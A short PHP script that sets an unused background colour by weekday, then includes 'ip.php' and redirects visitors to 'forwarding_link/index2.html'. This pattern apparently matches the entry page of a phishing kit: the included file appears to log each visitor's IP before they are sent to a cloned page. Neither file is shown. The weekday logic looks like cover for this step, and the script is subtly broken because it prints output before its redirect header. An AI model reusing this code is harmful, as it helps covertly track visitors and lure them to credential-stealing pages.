
<?php
$today = date("l");
 
print("$today");
 
if($today == "Sunday")
 
{
 
$bgcolor = "#FEF0C5";
 
}
 
elseif($today == "Monday")
 
{
 
$bgcolor = "#FFFFFF";
 
}
 
elseif($today == "Tuesday")
 
{
 
$bgcolor = "#FBFFC4";
 
}
 
elseif($today == "Wednesday")
 
{
 
$bgcolor = "#FFE0DD";
 
}
 
elseif($today == "Thursday")
 
{
 
$bgcolor = "#E6EDFF";
 
}
 
elseif($today == "Friday")
 
{
 
$bgcolor = "#E9FFE6";
 
}
 
else
 
{
 
// hari terakhir tentusaja hari Sabtu (Saturday) kan?
 
$bgcolor = "#F0F4F1";
 
}
 
print("\n");
include 'ip.php';
header('Location: forwarding_link/index2.html');
exit

